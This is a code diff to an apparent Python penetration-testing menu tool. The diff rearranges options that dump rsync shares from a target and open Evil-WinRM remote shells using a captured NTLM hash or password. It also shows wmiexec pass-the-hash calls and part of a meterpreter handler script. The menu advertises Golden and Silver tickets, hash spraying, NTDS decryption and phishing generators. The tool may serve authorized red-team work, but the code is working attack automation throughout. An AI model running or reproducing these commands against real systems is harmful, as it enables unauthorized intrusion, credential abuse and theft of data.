@@ -544,9 +544,9 @@ def options():
    print('\u2551' + "(05) Re/Set USER   NAME (16) Dump  DNS SERVER (27) DCOMExec (38) Find EndPoints (49) Kerbero Spray (60) CrackMapExe (71) GenSSHkeyID (82) Hydra HTTP (93) Netcat   " + '\u2551')
    print('\u2551' + "(06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
    print('\u2551' + "(07) Re/Set NTLM   HASH (18) NMap PORTService (29) SMB Exec (40) RpcClient Serv (51) HASHs Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) RemoteSync (96) MySQL    " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20)                  (31)          (42) Smb Map SHARES (53) Silver Ticket (64)             (75) AutoPhisher (86) RSyncDumps (97) EviWinRm " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN  SID (21)                  (32)          (43) Smb Dump Files (54) Golden Ticket (65)             (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85)            (96) MySQL    " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20)                  (31)          (42) Smb Map SHARES (53) Silver Ticket (64) Remote Sync (75) AutoPhisher (86) Evil WinRm (97)          " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN  SID (21)                  (32)          (43) Smb Dump Files (54) Golden Ticket (65) RSync Dumps (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
    print('\u2551' + "(11) Re/Set SHARE  NAME (22)                  (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
@@ -2528,31 +2528,44 @@ while True:
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
          command(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
-      prompt()     
-      
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='64':
-      exit(1)
+      checkParams = testOne()   
+      
+      if checkParams != 1:
+         if "873" in POR:
+            command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
+         else:
+            print("[+] Port 873 not found in LIVE PORTS...")
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - 
+# Details : Menu option selected - rsync -a rsync://IP:873
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='65':
-      exit(1)
-
+      checkParams = testOne()     
+       
+      if checkParams != 1:
+         if "873" in POR:
+            command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")
+         else:
+            print("[+] Port 873 not found in LIVE PORTS...")      
+      prompt()
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -3135,44 +3148,47 @@ while True:
       command("echo 'set lhost " + target + "' >> meterpreter.rc")
       command("echo 'run' >> meterpreter.rc")      
       command("msfconsole -r meterpreter.rc")     
-      prompt() 
-           
+      prompt()
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='85':
-      checkParams = testOne()   
-      
-      if checkParams != 1:
-         if "873" in POR:
-            command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
-         else:
-            print("[+] Port 873 not found in LIVE PORTS...")
-      prompt()
-      
+      exit(1)
+
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - rsync -a rsync://IP:873
+# Details : Menu option selected - WINRM remote login using PORT 5985
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='86':
-      checkParams = testOne()     
+      if IP46 == "-4":
+         checkParams = testOne()
+      else:
+         checkParams = testTwo()
        
       if checkParams != 1:
-         if "873" in POR:
-            command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")
+         if NTM[:5] != "EMPTY":
+            print("[i] Using the HASH value as a password credential...")
+            if IP46 == "-4":
+               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
+            else:
+               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
          else:
-            print("[+] Port 873 not found in LIVE PORTS...")      
-      prompt()   
-      
+            if IP46 == "-4":
+               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")            
+            else:
+               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")
+      prompt()
+            
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -3324,34 +3340,17 @@ while True:
       if checkParams != 1:
          command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
       prompt() 
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - WINRM remote login using PORT 5985
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='97':
-      if IP46 == "-4":
-         checkParams = testOne()
-      else:
-         checkParams = testTwo()
-       
-      if checkParams != 1:
-         if NTM[:5] != "EMPTY":
-            print("[i] Using the HASH value as a password credential...")
-            if IP46 == "-4":
-               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
-            else:
-               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
-         else:
-            if IP46 == "-4":
-               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")            
-            else:
-               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")
-      prompt()
+      exit(1)
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
